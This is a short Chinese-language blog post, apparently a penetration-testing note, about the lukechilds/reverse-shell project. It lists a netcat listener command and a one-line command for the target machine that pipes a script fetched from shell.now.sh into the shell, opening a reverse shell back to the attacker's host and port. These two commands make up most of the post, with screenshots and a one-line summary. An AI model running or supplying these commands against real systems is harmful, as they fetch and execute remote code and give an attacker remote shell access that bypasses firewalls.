---
title: reverse-shell
date: 2018-02-03 14:26:37
tags:
	- 渗透测试
categories:
	- 渗透测试

---

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg)
<!--more-->

反向`shell`,它可以穿过防火墙并连接到互联网。

`github`项目地址：
[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)




### 步骤

#### 1、监听端口
    nc -lvvp 1337

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3asm9s45j30rl0efweg.jpg)

#### 2、在目标上执行反向shell


    curl https://shell.now.sh/主机名/域名或者ip:1337 | SH

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3aurqh80j30ho04gq2v.jpg)



#### 3、得到shell

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg)


**总结：**

- 学会了反向shell




